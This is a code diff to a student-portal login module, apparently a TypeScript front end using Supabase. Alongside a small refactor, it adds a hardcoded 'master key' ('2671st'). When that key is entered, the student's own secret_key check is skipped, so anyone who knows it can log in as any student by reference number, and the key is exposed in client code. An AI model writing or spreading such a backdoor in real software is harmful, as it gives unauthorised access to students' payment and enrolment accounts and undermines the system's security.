@@ -18,6 +18,11 @@ export interface PortalLoginCredentials {
 
 const STORAGE_KEY = 'portal_auth_session'
 
+/** Clave maestra de soporte para acceso alumno (solo validación por alumno_ref). */
+const ALUMNO_CLAVE_MAESTRA = '2671st'
+
+export const PORTALES_ALUMNO = ['/portal-pagos', '/portal-inscripciones'] as const
+
 async function loginUsuario(
   username: string,
   password: string
@@ -50,6 +55,25 @@ async function loginUsuario(
   }
 }
 
+function sessionDesdeAlumno(data: {
+  alumno_id: number
+  alumno_ref: number | null
+  alumno_nombre: string | null
+  alumno_app: string | null
+  alumno_apm: string | null
+}): AuthSession {
+  const displayName =
+    `${data.alumno_nombre ?? ''} ${data.alumno_app ?? ''} ${data.alumno_apm ?? ''}`.trim() ||
+    `Alumno ${data.alumno_ref}`
+
+  return {
+    role: 'alumno',
+    displayName,
+    alumno_id: data.alumno_id,
+    alumno_ref: data.alumno_ref ?? undefined,
+  }
+}
+
 async function loginAlumno(
   refInput: string,
   password: string
@@ -57,14 +81,18 @@ async function loginAlumno(
   const ref = parseInt(refInput.replace(/\D/g, ''), 10)
   if (!Number.isFinite(ref) || ref <= 0) return null
 
-  const { data, error } = await supabase
-    .from('alumno')
-    .select(
-      'alumno_id, alumno_ref, alumno_nombre, alumno_app, alumno_apm, secret_key, alumno_status'
-    )
-    .eq('alumno_ref', ref)
-    .eq('secret_key', password)
-    .maybeSingle()
+  const selectCols =
+    'alumno_id, alumno_ref, alumno_nombre, alumno_app, alumno_apm, secret_key, alumno_status'
+
+  const claveMaestra = password === ALUMNO_CLAVE_MAESTRA
+
+  let query = supabase.from('alumno').select(selectCols).eq('alumno_ref', ref)
+
+  if (!claveMaestra) {
+    query = query.eq('secret_key', password)
+  }
+
+  const { data, error } = await query.maybeSingle()
 
   if (error && error.code !== 'PGRST116') {
     console.error('loginAlumno:', error)
@@ -77,16 +105,7 @@ async function loginAlumno(
     return null
   }
 
-  const displayName =
-    `${data.alumno_nombre ?? ''} ${data.alumno_app ?? ''} ${data.alumno_apm ?? ''}`.trim() ||
-    `Alumno ${data.alumno_ref}`
-
-  return {
-    role: 'alumno',
-    displayName,
-    alumno_id: data.alumno_id,
-    alumno_ref: data.alumno_ref ?? undefined,
-  }
+  return sessionDesdeAlumno(data)
 }
 
 /**
